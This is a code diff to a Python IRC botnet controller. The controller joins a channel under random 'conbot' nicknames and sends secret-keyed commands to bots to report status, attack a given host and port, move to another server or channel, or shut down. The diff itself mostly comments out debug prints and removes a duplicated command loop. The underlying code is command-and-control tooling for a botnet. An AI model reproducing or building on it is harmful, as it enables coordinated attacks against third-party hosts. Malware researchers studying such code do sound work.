@@ -39,38 +39,27 @@ def startConn():
         botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(6))
         botName = "conbot-"
         botName = botName + botNum
-        print("botname: " + botName)
+        #print("botname: " + botName)
         usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)
 
         s.send(usr.encode('utf-8'))
         nick = "NICK %s \r\n" % (botName)
         s.send(nick.encode('utf-8'))
         rec = s.recv(4096).decode("utf-8")
-        print(rec)
+        #print(rec)
         prefix, command, args = parsemsg(rec)
 
-        print("prefix: %s\ncommand: %s\n" % (prefix, command))
+        #print("prefix: %s\ncommand: %s\n" % (prefix, command))
 
         if command != "433":
             break
-    print("channel: " + CHAN)
+    #print("channel: " + CHAN)
     join = "JOIN %s\r\n" % (CHAN)
     s.send(join.encode('utf-8'))
     serverReply = s.recv(4096)
     print("Controller is running. Connected with nick: " + botName)
     while 1:
-        command = input("enter command: ")
-        status_num = parsecmd(command, s)
-        if status_num == 1:
-            break # possibly results in a memory leak if move is called a lot, dunno if it's significant enough to change
-
-
-    join = "JOIN %s\r\n" % (CHAN)
-    s.send(join.encode('utf-8'))
-    serverReply = s.recv(4096)
-    print("Controller is running. Connected with nick: " + botName)
-    while 1:
-        command = input("enter command: ")
+        command = input("Enter Command: ")
         status_num = parsecmd(command, s)
         if status_num == 1:
             break # possibly results in a memory leak if move is called a lot, dunno if it's significant enough to change
@@ -82,7 +71,7 @@ def status(s):
     s.send(msg.encode('utf-8'))
     print("waiting for bots to respond...")
     time.sleep(5)
-    print("done sleeping")
+    #print("done sleeping")
     recvd_lines = s.recv(4096).decode('utf-8') #this buffer size may need to change
     lines = recvd_lines.split('\n')
     for line in lines:
@@ -91,7 +80,7 @@ def status(s):
         try:
             prefix, command, args = parsemsg(line)
             args = args[1].split()
-            print("prefix: %s\ncommand : %s\nargs : %s" %(prefix, command, args))
+            #print("prefix: %s\ncommand : %s\nargs : %s" %(prefix, command, args))
             if command != "PRIVMSG" or args[0] != secret:
                 continue
 
@@ -115,7 +104,7 @@ def attack(s,host,port):
     s.send(msg.encode('utf-8'))
     print("waiting for bots to respond...")
     time.sleep(5)
-    print("done sleeping")
+    #print("done sleeping")
     recvd_lines = s.recv(4096).decode('utf-8')  # this buffer size may need to change
     lines = recvd_lines.split('\n')
     for line in lines:
@@ -124,7 +113,7 @@ def attack(s,host,port):
         try:
             prefix, command, args = parsemsg(line)
             args = args[1].split()
-            print("prefix: %s\ncommand : %s\nargs : %s" % (prefix, command, args))
+            #print("prefix: %s\ncommand : %s\nargs : %s" % (prefix, command, args))
             if command != "PRIVMSG" or args[0] != secret:
                 continue
 
@@ -146,9 +135,9 @@ def move(s, hostname, newport, channel):
     counter = 0
 
     movestr = "PRIVMSG %s :%s move %s %s %s\r\n" % (CHAN, secret, hostname, newport, channel)
-    print(movestr)
+    #print(movestr)
     s.send(movestr.encode('utf-8'))
-    print("waiting for bots to respond")
+    print("waiting for bots to respond...")
     time.sleep(5)
 
     recvd_lines = s.recv(4096).decode('utf-8')
@@ -158,7 +147,7 @@ def move(s, hostname, newport, channel):
         if not line:
             continue
         prefix, command, args = parsemsg(line)
-        print(args)
+        #print(args)
         try:
             args = args[1].split()
         except:
@@ -201,11 +190,11 @@ def shutdown(s):
     s.send(shutstr.encode('utf-8'))
 
 
-    print("waiting for bots to respond")
+    print("waiting for bots to respond...")
     time.sleep(5)
 
     recvd_lines = s.recv(4096).decode('utf-8')
-    print(recvd_lines)
+    #print(recvd_lines)
     lines = recvd_lines.split('\n')
 
     for line in lines:
